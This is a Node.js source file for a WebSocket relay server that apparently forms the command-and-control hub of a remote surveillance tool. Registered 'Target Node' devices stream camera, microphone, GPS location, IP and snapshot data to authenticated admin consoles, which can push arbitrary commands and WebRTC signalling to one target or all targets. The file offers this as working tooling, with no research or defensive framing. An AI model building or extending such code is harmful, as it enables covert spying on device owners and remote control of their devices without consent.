const { WebSocketServer, WebSocket } = require('ws');
const { authManager } = require('./auth');

function getDeviceName(telemetry) {
  if (!telemetry || !telemetry.system) return 'Target Device';
  const ua = telemetry.system.userAgent || '';
  if (/Android/i.test(ua)) return 'Android Phone';
  if (/iPhone/i.test(ua)) return 'iPhone';
  if (/iPad/i.test(ua)) return 'iPad';
  if (/Macintosh/i.test(ua)) return 'Mac';
  if (/Windows/i.test(ua)) return 'Windows PC';
  if (/Linux/i.test(ua)) return 'Linux PC';
  return 'Target Device';
}

function extractClientMeta(req) {
  if (!req) return { ip: '127.0.0.1', country: null };
  const cfIp = req.headers['cf-connecting-ip'];
  const xForwardedFor = req.headers['x-forwarded-for'];
  const cfCountry = req.headers['cf-ipcountry'] || null;

  let ip = cfIp;
  if (!ip && xForwardedFor) {
    ip = xForwardedFor.split(',')[0].trim();
  }
  if (!ip) {
    ip = req.socket ? req.socket.remoteAddress : '127.0.0.1';
  }
  if (typeof ip === 'string' && ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }
  return { ip: ip || '127.0.0.1', country: cfCountry };
}

class SocketRelay {
  constructor(servers) {
    this.wss = new WebSocketServer({ noServer: true });
    this.clients = new Map(); // clientId -> { ws, clientId, name, telemetry, connectedAt }
    this.admins = new Set();
    this.heartbeatInterval = null;

    // Attach upgrade listener to all provided servers (e.g. HTTPS port 3000 and HTTP port 3001)
    const serverList = Array.isArray(servers) ? servers : (servers ? [servers] : []);
    for (const server of serverList) {
      if (server && typeof server.on === 'function') {
        server.on('upgrade', (req, socket, head) => {
          this.wss.handleUpgrade(req, socket, head, (ws) => {
            this.wss.emit('connection', ws, req);
          });
        });
      }
    }

    this.init();
    this.startHeartbeat();
  }

  startHeartbeat() {
    this.heartbeatInterval = setInterval(() => {
      for (const ws of this.wss.clients) {
        if (ws.isAlive === false) {
          console.log(`[!] Terminating inactive socket [${ws.clientId || ws.role}]`);
          ws.terminate();
          continue;
        }
        ws.isAlive = false;
        try {
          ws.ping();
        } catch (e) {}
      }
    }, 30000);
  }

  getDeviceList() {
    return Array.from(this.clients.values()).map(c => ({
      id: c.clientId,
      name: c.name || getDeviceName(c.telemetry),
      telemetry: c.telemetry,
      connectedAt: c.connectedAt
    }));
  }

  init() {
    this.wss.on('connection', (ws, req) => {
      ws.role = 'unknown';
      ws.clientId = null;
      ws.meta = extractClientMeta(req);
      ws.isAlive = true;

      ws.on('pong', () => {
        ws.isAlive = true;
      });

      ws.on('message', (messageData) => {
        try {
          const data = JSON.parse(messageData);
          this.handleMessage(ws, data);
        } catch (err) {
          console.error('Error processing WS message:', err.message);
        }
      });

      ws.on('close', () => {
        this.handleDisconnect(ws);
      });

      ws.on('error', (err) => {
        console.error('WS Error:', err.message);
      });
    });
  }

  handleMessage(ws, data) {
    if (data.type === 'heartbeat') {
      ws.isAlive = true;
      try {
        ws.send(JSON.stringify({ type: 'heartbeat_ack', timestamp: Date.now() }));
      } catch (e) {}
      return;
    }

    if (data.type === 'register') {
      ws.role = data.role; // 'client' or 'admin'
      if (ws.role === 'client') {
        const clientId = data.clientId || ws.clientId || `node_${Math.random().toString(36).substring(2, 7)}`;
        
        // If this socket previously registered under another clientId, clean it up
        if (ws.clientId && ws.clientId !== clientId) {
          this.clients.delete(ws.clientId);
        }

        // If an old socket had this clientId, clean up the old socket
        const existing = this.clients.get(clientId);
        if (existing && existing.ws !== ws) {
          try { existing.ws.close(); } catch (e) {}
        }

        ws.clientId = clientId;

        const defaultTelemetry = data.telemetry || (existing ? existing.telemetry : {
          camera: { active: false, label: '', resolution: '', facingMode: 'user' },
          microphone: { active: false, label: '', volumeLevel: 0 },
          location: { active: false, latitude: null, longitude: null, accuracy: null, altitude: null, heading: null, speed: null, timestamp: null },
          system: { userAgent: 'Unknown', online: true, battery: 'Unknown' },
          network: { ip: ws.meta?.ip || 'Local', country: ws.meta?.country || null }
        });

        const mergedTelemetry = {
          ...defaultTelemetry,
          ...(data.telemetry || {}),
          network: {
            ip: ws.meta?.ip || (defaultTelemetry.network ? defaultTelemetry.network.ip : 'Local'),
            country: ws.meta?.country || (defaultTelemetry.network ? defaultTelemetry.network.country : null)
          }
        };

        const clientRecord = {
          ws,
          clientId,
          name: getDeviceName(mergedTelemetry),
          telemetry: mergedTelemetry,
          connectedAt: existing ? existing.connectedAt : Date.now()
        };

        this.clients.set(clientId, clientRecord);
        console.log(`[+] Target Node connected [${clientId}: ${clientRecord.name}] (Total: ${this.clients.size})`);

        // Send assigned ID back to client
        ws.send(JSON.stringify({
          type: 'assigned_id',
          clientId
        }));

        // Broadcast updated device list to admins
        this.broadcastToAdmins({
          type: 'device_list',
          devices: this.getDeviceList()
        });

      } else if (ws.role === 'admin') {
        const token = data.token;
        if (!authManager.verifySessionToken(token)) {
          ws.role = 'unauthenticated_admin';
          ws.isAuthenticated = false;
          console.warn(`[!] Unauthorized admin connection attempt from [${ws.meta?.ip}]`);
          ws.send(JSON.stringify({
            type: 'auth_required',
            error: 'Authentication required. Please unlock with PIN and Passkey.'
          }));
          return;
        }

        ws.isAuthenticated = true;
        this.admins.add(ws);
        console.log(`[+] Authenticated Admin Console connected (Total admins: ${this.admins.size})`);

        ws.send(JSON.stringify({
          type: 'initial_state',
          devices: this.getDeviceList()
        }));

        // Trigger offer request to all active clients
        if (this.clients.size > 0) {
          this.broadcastToClients({
            type: 'admin_command',
            command: 'request_offer'
          });
        }
      }
      return;
    }

    // In-socket authentication upgrade (when authenticated after initial connection)
    if (data.type === 'admin_auth') {
      const token = data.token;
      if (authManager.verifySessionToken(token)) {
        ws.role = 'admin';
        ws.isAuthenticated = true;
        this.admins.add(ws);
        console.log(`[+] Admin authenticated via WebSocket from [${ws.meta?.ip}] (Total admins: ${this.admins.size})`);

        ws.send(JSON.stringify({
          type: 'auth_success',
          devices: this.getDeviceList()
        }));

        if (this.clients.size > 0) {
          this.broadcastToClients({
            type: 'admin_command',
            command: 'request_offer'
          });
        }
      } else {
        ws.send(JSON.stringify({
          type: 'auth_failed',
          error: 'Invalid or expired session token'
        }));
      }
      return;
    }

    if (ws.role === 'client') {
      const clientId = ws.clientId;
      const clientRecord = this.clients.get(clientId);

      if (data.type === 'telemetry_update') {
        if (clientRecord) {
          clientRecord.telemetry = {
            ...clientRecord.telemetry,
            ...data.telemetry,
            network: {
              ip: ws.meta?.ip || clientRecord.telemetry.network?.ip || 'Local',
              country: ws.meta?.country || clientRecord.telemetry.network?.country || null
            }
          };
          clientRecord.name = getDeviceName(clientRecord.telemetry);
        }
        this.broadcastToAdmins({
          type: 'telemetry_update',
          clientId,
          telemetry: clientRecord ? clientRecord.telemetry : data.telemetry,
          devices: this.getDeviceList()
        });
      } else if (data.type === 'snapshot_data') {
        this.broadcastToAdmins({
          ...data,
          clientId
        });
      } else if (data.type === 'webrtc_signal') {
        this.broadcastToAdmins({
          type: 'webrtc_signal',
          clientId,
          signal: data.signal
        });
      }
    } else if (ws.role === 'admin') {
      if (!this.admins.has(ws) || !ws.isAuthenticated) {
        console.warn(`[!] Blocked command/signal from unauthenticated socket [${ws.meta?.ip}]`);
        return;
      }
      if (data.type === 'admin_command') {
        console.log(`[CMD] Admin issued: ${data.command} (Target: ${data.targetClientId || 'ALL'})`);
        if (data.targetClientId && data.targetClientId !== 'all') {
          const client = this.clients.get(data.targetClientId);
          if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
              type: 'admin_command',
              command: data.command,
              payload: data.payload
            }));
          }
        } else {
          this.broadcastToClients({
            type: 'admin_command',
            command: data.command,
            payload: data.payload
          });
        }
      } else if (data.type === 'webrtc_signal') {
        if (data.targetClientId) {
          const client = this.clients.get(data.targetClientId);
          if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
              type: 'webrtc_signal',
              signal: data.signal
            }));
          }
        } else {
          this.broadcastToClients({
            type: 'webrtc_signal',
            signal: data.signal
          });
        }
      }
    }
  }

  handleDisconnect(ws) {
    if (ws.role === 'client' && ws.clientId) {
      this.clients.delete(ws.clientId);
      console.log(`[-] Target Node disconnected [${ws.clientId}] (Remaining: ${this.clients.size})`);
      this.broadcastToAdmins({
        type: 'device_list',
        devices: this.getDeviceList()
      });
    } else if (ws.role === 'admin') {
      this.admins.delete(ws);
      console.log(`[-] Admin Console disconnected (Remaining: ${this.admins.size})`);
    }
  }

  broadcastToAdmins(msgObj) {
    const json = JSON.stringify(msgObj);
    for (const admin of this.admins) {
      if (admin.readyState === WebSocket.OPEN) {
        admin.send(json);
      }
    }
  }

  broadcastToClients(msgObj) {
    const json = JSON.stringify(msgObj);
    for (const client of this.clients.values()) {
      if (client.ws.readyState === WebSocket.OPEN) {
        client.ws.send(json);
      }
    }
  }
}

module.exports = { SocketRelay };
